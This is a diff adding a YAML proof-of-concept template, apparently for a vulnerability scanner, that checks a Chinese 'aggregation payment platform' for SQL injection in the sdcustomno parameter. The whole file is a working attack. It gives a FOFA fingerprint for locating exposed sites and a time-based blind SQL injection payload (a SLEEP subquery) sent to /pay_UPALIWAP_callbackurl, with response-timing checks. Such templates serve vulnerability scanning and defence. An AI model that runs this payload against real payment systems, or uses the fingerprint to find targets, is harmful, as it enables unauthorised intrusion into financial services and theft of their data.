@@ -1,0 +1,27 @@
+id: poc-yaml-aggregation-payment-sdcustomno-sqli
+info:
+  name: 聚合支付平台 sdcustomno SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 聚合支付平台
+  fofa: body="/Public/theme/view4/css/style.css"
+variables:
+  t1: random_int(5,10)
+  t2: t1 + 2
+requests:
+- method: GET
+  path: /
+  expression: status_code == 200 && contains(body,"/Public/theme/view4/css/style.css")
+- method: GET
+  path: /pay_UPALIWAP_callbackurl?sdcustomno=%27)%20AND%20(SELECT%202941%20FROM%20(SELECT(SLEEP({{.t1}})))OCiy)%20AND%20(%27KPIR%27=%27KPIR
+  expression: 'status_code == 200 &&
+
+    body == "ok" &&
+
+    duration > 5 &&
+
+    duration < 7
+
+    '
+transport: http
